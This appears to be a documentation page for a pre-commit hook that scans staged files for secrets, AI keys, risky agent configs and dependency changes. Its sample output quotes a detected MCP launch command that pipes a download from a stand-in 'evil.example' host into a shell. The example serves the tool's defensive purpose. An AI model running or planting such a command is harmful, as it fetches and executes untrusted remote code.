---
title: "Pre-commit hook: penthera hook"
sidebarTitle: "Pre-commit hook"
description: "Once a secret is pushed, rotating it is the only fix."
---

> **Pro.** For "how do I put it in CI?"

## Block it before it's committed

Once a secret is pushed, rotating it is the only fix. The pre-commit hook runs
the checks that matter on what you are about to commit, and nothing else:

```bash
penthera hook install     # writes .git/hooks/pre-commit; an existing hook is kept and runs first
penthera hook run         # what the hook runs; try it on staged changes
penthera hook uninstall   # removes it and puts your old hook back
```

`penthera hook install --force` writes into `core.hooksPath` even when another
tool manages it. `penthera hook run --verbose` also lists findings below the
blocking severity.

On staged content only (the git index, not your working tree):

- secrets and AI provider keys in staged files;
- `penthera agents` rules on staged agent config: `.mcp.json`, `CLAUDE.md`,
  `AGENTS.md`, `GEMINI.md`, `.cursorrules`, `.windsurfrules`, VS Code and Gemini
  settings, and folders such as `.claude/`, `.cursor/`, `.codex/`, `.agents/`
  and `skills/`;
- when `package-lock.json` or `npm-shrinkwrap.json` is staged, the capability diff against HEAD's
  lockfile and the license policy, for the packages this commit adds.

```
  ✗ penthera blocked this commit: 2 findings at high or above (2 staged files, 1 agent config, 0.1s)

  ✗ CRITICAL .mcp.json  MCP server "x" launches by downloading and running code  id b5914a44a2058da9
      → Launch command contains a download piped to a shell: `curl https://evil.example/x.sh | sh`.
  ✗ CRITICAL config.js:1  Anthropic API key in source  sk-a…AAAA  id 7a0eb6998ff38787
      → Load it from an env var or secret store and unstage the file; rotate it if it was ever pushed or shared.

  Fix and `git add` again. A false positive? Add it to penthera.suppress.json:
    { "version": 1, "suppress": [{ "id": "b5914a44a2058da9", "reason": "why this is safe" }] }
  To skip the check for one commit: git commit --no-verify (the finding still ships)
```

It blocks on high and critical by default and takes about 0.1 to 0.5 s.
Configure it in `penthera.policy.json`:

```json
{ "hook": { "blockOn": "high", "ignore": ["tests/fixtures/**"],
            "checks": { "secrets": true, "agents": true, "deps": true, "licenses": true } } }
```

A staged file larger than 16 MB is not read, and it blocks the commit with a
warning that names it, since it could hold a secret nobody checked. Add it to
`ignore`, or set `"largeFiles": "warn"` in the `hook` section to only warn.

The repo being committed can shape the hook's environment, through direnv or a
project `.npmrc`. The hook `penthera hook install` writes drops `NODE_OPTIONS`
and `NODE_PATH` before anything runs, since they would load the repo's code into
Node. A global `penthera` runs only when its real path is outside the repo. The
`npx` fallback runs from `/`, without any `npm_config_*` setting, with npm's own
registry and your account's own cache, and is told the repo with `--repo`. The
lockfile check reads your account's npm cache (`~/.npm`) as well as any
`npm_config_cache`, and a cached package counts only when it matches the
lockfile's integrity.

The environment's `PATH` is still the one the shell gives git, so a `PATH` that
direnv changes can put another `git` or `npx` in front. Allow direnv only in
repos you trust.

If husky or lefthook manage your hooks (`core.hooksPath` is set),
`penthera hook install` says so instead of overwriting them. Add one line to
that tool instead:

```bash
# husky
echo "npx --no-install penthera hook run" >> .husky/pre-commit
```

```yaml
# lefthook.yml
pre-commit:
  commands:
    penthera:
      run: npx --no-install penthera hook run
```

These managers run `penthera hook run` with their own environment, so the
`NODE_OPTIONS` and `NODE_PATH` step above doesn't apply. Clear them in the
hook line if the repo can set them: `NODE_OPTIONS= NODE_PATH= npx --no-install penthera hook run`.

```yaml
# .pre-commit-config.yaml (pre-commit.com)
repos:
  - repo: https://github.com/danoszz/penthera
    rev: <tag or sha>
    hooks:
      - id: penthera
```

[Back to the README](https://github.com/danoszz/penthera/blob/main/README.md) · [All commands](https://github.com/danoszz/penthera/blob/main/docs/commands/README.md)
